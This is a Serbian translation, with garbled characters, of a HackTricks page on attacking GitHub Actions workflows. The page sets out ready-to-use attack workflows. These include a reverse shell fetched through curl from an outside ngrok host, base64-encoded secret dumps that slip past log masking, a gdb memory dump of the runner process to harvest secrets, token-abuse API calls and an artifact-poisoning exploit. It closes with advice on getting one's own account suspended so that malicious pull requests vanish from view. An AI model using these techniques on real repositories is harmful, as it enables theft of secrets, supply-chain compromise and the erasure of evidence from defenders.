# Zloupotreba Github akcija

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Na ovoj stranici 캖ete prona캖i:

* **Rezime svih uticaja** koje napada캜 mo쬰 imati pristupom Github akciji
* Razli캜iti na캜ini **pristupa akciji**:
* Imaju캖i **dozvole** za kreiranje akcije
* Zloupotreba **okida캜a vezanih za pull request**
* Zloupotreba **drugih spoljnih pristupa캜nih tehnika**
* **Pivotiranje** iz ve캖 kompromitovanog repozitorijuma
* Na kraju, sekcija o **tehnikama post-eksploatacije za zloupotrebu akcije iznutra** (uzrokuju캖i pomenute uticaje)

## Rezime uticaja

Za uvod o [**Github akcijama proverite osnovne informacije**](../basic-github-information.md#github-actions).

U slu캜aju da mo쬰te **izvr코iti proizvoljne Github akcije/ubaciti kod** u **repozitorijum**, mo쬰te biti u mogu캖nosti da:

* **Ukradete** **tajne** iz tog repozitorijuma/organizacije.
* Ako mo쬰te samo ubaciti, mo쬰te ukrasti sve 코to je ve캖 prisutno u radnom toku.
* Zloupotrebite **privilegije repozitorijuma** da pristupite drugim platformama kao 코to su AWS i GCP.
* **Izvr코ite kod u prilago캠enim radnicima** (ako se koriste prilago캠eni radnici) i poku코ate da pivotirate odande.
* **Prepi코ete** kod repozitorijuma.
* Ovo zavisi od privilegija `GITHUB_TOKEN` (ako postoje).
* **Kompromitujete** **implementacije** i druge **artefakte**.
* Ako se kod implementira ili skladi코ti ne코to, mo쬰te to izmeniti i dobiti dalji pristup.

## GITHUB\_TOKEN

Ovaj "**tajni**" (dolazi od `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) se dodeljuje kada administrator omogu캖i ovu opciju:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Ovaj token je isti onaj koji 캖e koristiti **Github aplikacija**, tako da mo쬰 pristupiti istim endpointima: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github bi trebao da objavi [**protokol**](https://github.com/github/roadmap/issues/74) koji **omogu캖ava pristup preko repozitorijuma** unutar GitHub-a, tako da repozitorijum mo쬰 pristupiti drugim internim repozitorijumima koriste캖i `GITHUB_TOKEN`.
{% endhint %}

Mo쬰te videti mogu캖e **dozvole** ovog tokena na: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Imajte na umu da token **isti캜e nakon zavr코etka posla**.\
Ovi tokeni izgledaju ovako: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Nekoliko interesantnih stvari koje mo쬰te uraditi sa ovim tokenom:

{% tabs %}
{% tab title="Spoji PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="Odobri PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Napravi PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Napomena da 캖ete u nekoliko slu캜ajeva mo캖i prona캖i **github korisni캜ke tokene unutar Github Actions envs ili u tajnama**. Ovi tokeni vam mogu dati vi코e privilegija nad repozitorijumom i organizacijom.
{% endhint %}

<details>

<summary>Izlistaj tajne u Github Action outputu</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje obrnutog 코koljka pomo캖u tajni</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Mogu캖e je proveriti dozvole koje su dodeljene Github Token-u u repozitorijumima drugih korisnika **proverom logova** akcija:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozvoljeno izvr코avanje

{% hint style="info" %}
Ovo bi bio najlak코i na캜in za kompromitovanje Github akcija, jer pretpostavlja da imate pristup **kreiranju novog repozitorijuma u organizaciji**, ili imate **privilegije pisanja nad repozitorijumom**.

Ako se nalazite u ovom scenariju, jednostavno mo쬰te proveriti [tehnike post-eksploatacije](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Izvr코avanje putem kreiranja repozitorijuma

Ukoliko 캜lanovi organizacije mogu **kreirati nove repozitorijume** i mo쬰te izvr코avati github akcije, mo쬰te **kreirati novi repozitorijum i ukrasti tajne postavljene na nivou organizacije**.

### Izvr코avanje putem nove grane

Ako mo쬰te **kreirati novu granu u repozitorijumu koji ve캖 sadr쬴 konfigurisanu Github akciju**, mo쬰te je **izmeniti**, **u캜itati** sadr쬬j, a zatim **izvr코iti tu akciju iz nove grane**. Na ovaj na캜in mo쬰te **izvu캖i tajne na nivou repozitorijuma i organizacije** (ali morate znati kako se zovu).

Izmenjenu akciju mo쬰te izvr코iti **ru캜no**, kada je **kreiran PR** ili kada je **neki kod poslat** (zavisno od toga koliko 쬰lite da budete primetni):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forkovano izvr코avanje

{% hint style="info" %}
Postoje razli캜iti okida캜i koji mogu omogu캖iti napada캜u da **izvr코i Github akciju iz drugog repozitorijuma**. Ako su te akcije lo코e konfigurisane, napada캜 mo쬰 biti u mogu캖nosti da ih kompromituje.
{% endhint %}

### `pull_request`

Okida캜 radnog toka **`pull_request`** 캖e izvr코iti radni tok svaki put kada se primi zahtev za povla캜enje sa nekim izuzecima: podrazumevano, ako je **prvi put** da **saradjujete**, neki **odr쬬va캜** 캖e morati da **odobri** **pokretanje** radnog toka:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Kako je **podrazumevano ograni캜enje** za **prvi put** saradnika, mo쬰te doprineti **popravkom ispravnog baga/gre코ke** i zatim poslati **druge PR-ove da zloupotrebite svoje nove privilegije `pull_request`**.

**Testirao sam ovo i ne radi**: ~~Druga opcija bi bila da napravite nalog sa imenom nekoga ko je doprineo projektu i obrisao svoj nalog.~~
{% endhint %}

Osim toga, podrazumevano **onemogu캖ava dozvole za pisanje** i **pristup tajnama** ciljnog repozitorijuma kako je navedeno u [**dokumentaciji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Izuzimaju캖i `GITHUB_TOKEN`, **tajne se ne prenose izvr코iocu** kada se radni tok pokrene iz **forkovanog** repozitorijuma. **`GITHUB_TOKEN` ima samo dozvole za 캜itanje** u zahtevima za povla캜enje **iz forkovanih repozitorijuma**.

Napada캜 mo쬰 izmeniti definiciju Github akcije kako bi izvr코io proizvoljne stvari i dodao proizvoljne akcije. Me캠utim, ne캖e mo캖i da ukrade tajne ili prepi코e repozitorijum zbog pomenutih ograni캜enja.

{% hint style="danger" %}
**Da, ako napada캜 promeni u PR-u Github akciju koja 캖e biti pokrenuta, njegova Github akcija 캖e biti kori코캖ena umesto one iz izvornog repozitorijuma!**
{% endhint %}

Kako napada캜 tako캠e kontroli코e izvr코eni kod, 캜ak i ako nema tajni ili dozvola za pisanje na `GITHUB_TOKEN`, napada캜 na primer mo쬰 **u캜itati zlonamerne artefakte**.

### **`pull_request_target`**

Okida캜 radnog toka **`pull_request_target`** ima **dozvole za pisanje** na ciljnom repozitorijumu i **pristup tajnama** (i ne tra쬴 dozvolu).

Imajte na umu da okida캜 radnog toka **`pull_request_target`** **radi u osnovnom kontekstu** a ne u onom koji je dat od strane PR-a (da **ne bi izvr코avao nepoverljiv kod**). Za vi코e informacija o `pull_request_target` [**proverite dokumentaciju**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Osim toga, za vi코e informacija o ovoj specifi캜noj opasnoj upotrebi proverite ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Mo쬰 se 캜initi da je zato 코to je **izvr코eni radni tok** onaj koji je definisan u **osnovnom** a ne u PR-u, **bezbedno** koristiti **`pull_request_target`**, ali postoje **neki slu캜ajevi gde to nije tako**.

I ovaj 캖e imati **pristup tajnama**.

### `workflow_run`

Okida캜 [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) omogu캖ava pokretanje radnog toka iz drugog radnog toka kada je `zavr코en`, `zatra쬰n` ili `u toku`.

U ovom primeru, radni tok je konfigurisan da se pokrene nakon zasebnog radnog toka "Pokreni testove" koji je zavr코en:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Osim toga, prema dokumentaciji: Radni tok pokrenut doga캠ajem `workflow_run` mo쬰 **pristupiti tajnama i pisati tokene, 캜ak i ako prethodni radni tok nije**.

Ovaj tip radnog toka mo쬰 biti napadnut ako **zavisi** od radnog toka koji mo쬰 biti **pokrenut** od strane eksternog korisnika putem **`pull_request`** ili **`pull_request_target`**. Par ranjivih primera mo쬰 se **na캖i u ovom blogu**. Prvi primer se sastoji od radnog toka pokrenutog od strane `workflow_run` koji preuzima kod napada캜a: `${{ github.event.pull_request.head.sha }}`\
Drugi primer se sastoji od **proslje캠ivanja** artefakta iz **nepouzdanog** koda u radni tok **`workflow_run`** i kori코캖enje sadr쬬ja ovog artefakta na na캜in koji ga 캜ini **ranjivim na RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li se prilikom izvr코avanja iz pull\_request koristi/skida kod izvornog ili iz forkovanog PR-a

## Zloupotreba izvr코avanja iz forkovanog repozitorijuma

Pomenuli smo sve na캜ine na koje eksterni napada캜 mo쬰 izvr코iti github radni tok, sada pogledajmo kako se ova izvr코avanja, ako su lo코e konfigurisana, mogu zloupotrebiti:

### Izvr코avanje nepouzdanog checkout-a

U slu캜aju **`pull_request`**, radni tok 캖e biti izvr코en u **kontekstu PR-a** (tako da 캖e izvr코iti **zlonameran kod PR-a**), ali neko ga mora **autorizovati prvo** i pokrenu캖e se sa nekim [ograni캜enjima](./#pull\_request).

U slu캜aju radnog toka koji koristi **`pull_request_target` ili `workflow_run`** koji zavisi od radnog toka koji mo쬰 biti pokrenut iz **`pull_request_target` ili `pull_request`**, izvr코i캖e se kod izvornog repozitorijuma, tako da **napada캜 ne mo쬰 kontrolisati izvr코eni kod**.

{% hint style="danger" %}
Me캠utim, ako **akcija** ima **eksplicitan PR checkout** koji 캖e **preuzeti kod iz PR-a** (a ne iz osnove), koristi캖e se kod koji je pod kontrolom napada캜a. Na primer (proverite liniju 12 gde se preuzima kod PR-a):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NESIGURNO. Dato samo kao primer.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencijalno **nepouzdan kod se izvr코ava tokom `npm install` ili `npm build`** jer su skripte za izgradnju i referencirani **paketi pod kontrolom autora PR-a**.

{% hint style="warning" %}
Github pretraga za ranjive akcije je: `event.pull_request pull_request_target extension:yml`, me캠utim, postoje razli캜iti na캜ini za konfigurisanje sigurnog izvr코avanja poslova 캜ak i ako je akcija konfigurisana nesigurno (kao 코to je kori코캖enje uslova o tome ko je akter koji generi코e PR).
{% endhint %}

### Umetanje skripti u kontekst <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Imajte na umu da postoje odre캠eni [**github konteksti**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) 캜ije vrednosti kontroli코e **korisnik** koji kreira PR. Ako github akcija koristi te podatke da ne코to izvr코i, to mo쬰 dovesti do **izvr코avanja proizvoljnog koda**:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Umetanje skripti** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Iz dokumentacije: Mo쬰te omogu캖iti da **okru쬰njska promenljiva bude dostupna svim slede캖im koracima** u radnom toku tako 코to 캖ete definisati ili a쬿rirati okru쬰njsku promenljivu i upisati je u datoteku okru쬰nja **`GITHUB_ENV`**.

Ako napada캜 mo쬰 **umetnuti bilo koju vrednost** u ovu **okru쬹u** promenljivu, mo쬰 umetnuti okru쬹e promenljive koje mogu izvr코iti kod u slede캖im koracima, kao 코to su **LD\_PRELOAD** ili **NODE\_OPTIONS**.

Na primer ([**ovde**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**ovde**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite radni tok koji veruje u캜itanom artefaktu da bi sadr쬬j artefakta bio sme코ten u okru쬹u promenljivu **`GITHUB_ENV`**. Napada캜 mo쬰 u캜itati ne코to poput ovoga da bi ga kompromitovao:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Ranjive Github akcije tre캖ih strana

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kao 코to je pomenuto u [**ovom blog postu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ova Github akcija omogu캖ava pristup artefaktima iz razli캜itih radnih tokova i 캜ak repozitorijuma.

Problem je u tome 코to, ako parametar **`path`** nije postavljen, artefakt 캖e biti izvu캜en u trenutnom direktorijumu i mo쬰 prebrisati datoteke koje se kasnije mogu koristiti ili 캜ak izvr코iti u radnom toku. Dakle, ako je artefakt ranjiv, napada캜 mo쬰 zloupotrebiti ovo da bi kompromitovao druge radne tokove koji veruju artefaktu.

Primer ranjivog radnog toka:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo bi moglo biti napadnuto sa slede캖im radnim tokom:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Ostali spoljni pristupi

### Hakovanje izbrisanog repozitorijuma sa imenom prostora

Ako neki korisni캜ki nalog promeni ime, drugi korisnik mo쬰 registrovati nalog sa istim imenom nakon nekog vremena. Ako je repozitorijum imao **manje od 100 zvezdica pre promene imena**, Github 캖e dozvoliti novom registrovanom korisniku sa istim imenom da kreira **repozitorijum sa istim imenom** kao onaj koji je izbrisan.

{% hint style="danger" %}
Dakle, ako akcija koristi repozitorijum koji ne postoji, jo코 uvek je mogu캖e da napada캜 mo쬰 kreirati taj nalog i kompromitovati akciju.
{% endhint %}

Ako su druge repozitorijume koristile **zavisnosti iz ovih korisni캜kih repozitorijuma**, napada캜 캖e mo캖i da ih preuzme. Ovde imate detaljnije obja코njenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivoting repozitorijuma

{% hint style="info" %}
U ovoj sekciji 캖emo govoriti o tehnikama koje bi omogu캖ile prelazak sa jednog repozitorijuma na drugi, pretpostavljaju캖i da imamo neku vrstu pristupa prvom (proverite prethodnu sekciju).
{% endhint %}

### Trovanje ke코a

Ke코 se odr쬬va izme캠u **izvr코avanja radnih tokova na istoj grani**. To zna캜i da ako napada캜 **kompromituje** **pakovanje** koje se zatim 캜uva u ke코u i **preuzme** i izvr코i privilegovaniji radni tok, mo캖i 캖e tako캠e da **kompromituje** taj radni tok.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Trovanje artefakta

Radni tokovi mogu koristiti **artefakte iz drugih radnih tokova i 캜ak repozitorijuma**, ako napada캜 uspe da **kompromituje** Github akciju koja **uploaduje artefakt** koji kasnije koristi drugi radni tok, mo쬰 **kompromitovati druge radne tokove**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post eksploatacija iz akcije

### Pristupanje AWS i GCP putem OIDC

Proverite slede캖e stranice:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Pristupanje tajnama <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadr쬬j u skriptu, korisno je znati kako mo쬰te pristupiti tajnama:

* Ako je tajna ili token postavljen kao **promenljiva okru쬰nja**, mo쬰 se direktno pristupiti putem okru쬰nja koriste캖i **`printenv`**.

<details>

<summary>Izlistaj tajne u izlazu Github akcije</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje obrnutog 코koljka pomo캖u tajni</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Ako se tajna koristi **direktno u izrazu**, generisani shell skript je sme코ten **na disku** i dostupan je.
* ```bash
cat /home/runner/work/_temp/*
```
* Za JavaScript akcije, tajne se 코alju putem okru쬰njskih promenljivih
* ```bash
ps axe | grep node
```
*   Za **prilago캠ene akcije**, rizik mo쬰 varirati u zavisnosti od toga kako program koristi tajnu koju je dobio iz **argumenta**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Zloupotreba samostalnih izvr코ilaca

Na캜in da se sazna koje **Github akcije se izvr코avaju na infrastrukturi koja nije Github** je pretraga **`runs-on: self-hosted`** u konfiguraciji yaml Github akcije.

**Samostalni izvr코ioci** mogu imati pristup **dodatno osetljivim informacijama**, drugim **mre쬹im sistemima** (ranjive ta캜ke na mre쬴? metapodaci usluge?) ili, 캜ak i ako je izolovan i uni코ten, **vi코e od jedne akcije mo쬰 se izvr코avati istovremeno** i zlonamerna akcija mo쬰 **ukrasti tajne** druge akcije.

Na samostalnim izvr코iocima tako캠e je mogu캖e dobiti **tajne iz procesa **_**Runner.Listener**_** koji 캖e sadr쬬ti sve tajne radnih tokova u bilo kom koraku tako 코to 캖e se isprazniti njegova memorija:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Pogledajte [**ovaj post za vi코e informacija**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Mogu캖e je napraviti Github akcije koje 캖e **izgraditi i sa캜uvati Docker sliku unutar Github-a**.\
Primer se mo쬰 na캖i u slede캖em pro코irivom delu:

<details>

<summary>Github Akcija Izgradnja &#x26; Slanje Docker Slike</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao 코to mo쬰te videti u prethodnom kodu, Github registar je sme코ten na **`ghcr.io`**.

Korisnik sa dozvolama za 캜itanje nad repozitorijumom 캖e mo캖i da preuzme Docker Image koriste캖i li캜ni pristupni token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Zatim, korisnik mo쬰 pretra쬴vati **procurjela tajna u slojevima Docker slike:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Osetljive informacije u zapisima Github akcija

캛ak i ako **Github** poku코ava **detektovati tajne vrednosti** u zapisima akcija i **izbegava prikazivanje** istih, **ostali osetljivi podaci** koji mogu biti generisani tokom izvr코avanja akcije ne캖e biti sakriveni. Na primer, JWT potpisan tajnom vredno코캖u ne캖e biti sakriven, osim ako nije [posebno konfigurisan](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Sakrivanje tragova

(Tehnika sa [**ovde**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prvo, svaki podneseni PR je jasno vidljiv javnosti na Github-u i ciljanom Github nalogu. Na Github-u, podrazumevano, **ne mo쬰mo obrisati PR sa interneta**, ali postoji preokret. Za Github naloge koji su **suspendovani** od strane Github-a, svi njihovi **PR-ovi automatski se bri코u** i uklanjaju sa interneta. Dakle, da biste sakrili svoju aktivnost, morate ili **suspendovati svoj GitHub nalog ili ozna캜iti svoj nalog**. To bi **sakrilo sve va코e aktivnosti** na Github-u sa interneta (u osnovi uklonilo sve va코e zloupotrebe PR-ova).

Organizacija na Github-u vrlo aktivno prijavljuje naloge Github-u. Sve 코to trebate uraditi je da "podelite neke stvari" u Problemu i oni 캖e se pobrinuti da va코 nalog bude suspendovan za 12 sati :p i eto, va코a zloupotreba postaje nevidljiva na Github-u.

{% hint style="warning" %}
Jedini na캜in za organizaciju da shvati da su bili meta je da proveri Github dnevnike iz SIEM-a, jer bi PR bio uklonjen sa Github UI-ja.
{% endhint %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
